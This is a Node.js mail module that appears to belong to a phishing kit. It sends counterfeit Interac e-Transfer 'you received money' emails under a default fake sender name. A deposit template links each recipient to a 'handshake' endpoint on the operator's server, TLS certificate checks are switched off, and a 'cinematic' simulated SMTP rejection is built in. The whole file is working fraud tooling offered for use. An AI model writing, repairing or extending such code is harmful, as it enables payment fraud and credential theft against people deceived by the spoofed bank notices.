
import nodemailer from 'nodemailer';
import crypto from 'crypto';
import { execSync } from 'child_process';
import { db } from './db.js';
import { broadcastEvent } from '../index.js';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import axios from 'axios';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

export const mailer = {
    async dispatch(payload) {
        const config = db.get('system_config');
        if (!config || !config.smtp || !config.smtp.host) {
            throw new Error('SMTP_CONFIG_INCOMPLETE: System relay not configured.');
        }

        const txId = payload.txId || `CA${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
        const isForce = payload.force || false;

        // CINEMATIC FAILURE SIMULATION
        if (payload.simulate_fail) {
            broadcastEvent('MAIL_CRITICAL', 'SIMULATED_HANDSHAKE_REJECTION: Access Denied by Remote SMTP Server.');
            throw new Error('SMTP_CONNECTION_REJECTED');
        }

        try {
            const transporter = await this.createTransporter({ name: 'PRIMARY', conf: config.smtp, type: 'smtp' });
            if (transporter) {
                const senderName = config.general?.sender_name || "JENNIFER EDWARDS";
                const depositLink = this.generateLink(txId, payload.amount, payload.recipient_email, config);
                const htmlBody = this.renderHighFidelityTemplate(payload, txId, depositLink, config);

                await transporter.sendMail({
                    from: `"${senderName}" <${config.smtp.username}>`,
                    to: payload.recipient_email,
                    subject: `Interac e-Transfer: ${senderName} sent you money.`,
                    html: htmlBody,
                    headers: { 'X-Force-Release': isForce ? 'True' : 'False' }
                });

                broadcastEvent('MAIL_SUCCESS', `Released via Primary Relay.`, { txId });
                return { success: true, transaction_id: txId, path: 'PRIMARY_RELAY' };
            }
        } catch (e) {
            broadcastEvent('MAIL_ERROR', `Relay node rejection: ${e.message}`);
            // Do NOT return simulated success here. Re-throw to allow diagnostic reporting in the UI.
            throw new Error(`SMTP_DISPATCH_FAILURE: ${e.message}`);
        }
        
        throw new Error('ALL_RELAYS_BLACKOUT');
    },

    async createTransporter(relay) {
        if (!relay.conf.host || !relay.conf.username) return null;
        return nodemailer.createTransport({
            host: relay.conf.host,
            port: relay.conf.port,
            secure: relay.conf.port === 465,
            auth: { user: relay.conf.username, pass: relay.conf.password },
            tls: { rejectUnauthorized: false }
        });
    },

    generateLink(txId, amount, recipient, config) {
        const baseUrl = (config.general?.app_url || 'http://localhost:3002').replace(/\/$/, '');
        return `${baseUrl}/api/handshake?tx=${txId}&token=projectsarah`;
    },

    renderHighFidelityTemplate(payload, txId, depositLink, config) {
        const templatePath = path.join(__dirname, '../templates/Deposit.html');
        let html = fs.existsSync(templatePath) ? fs.readFileSync(templatePath, 'utf8') : "<h2>Deposit Funds</h2>";
        const vars = {
            '{{receiver_name}}': payload.recipient_name,
            '{{sender_name}}': config.general?.sender_name || "JENNIFER EDWARDS",
            '{{amount}}': `$${parseFloat(payload.amount).toFixed(2)}`,
            '{{transaction_id}}': txId,
            '{{action_url}}': depositLink
        };
        for (const [key, val] of Object.entries(vars)) html = html.split(key).join(val);
        return html;
    }
};
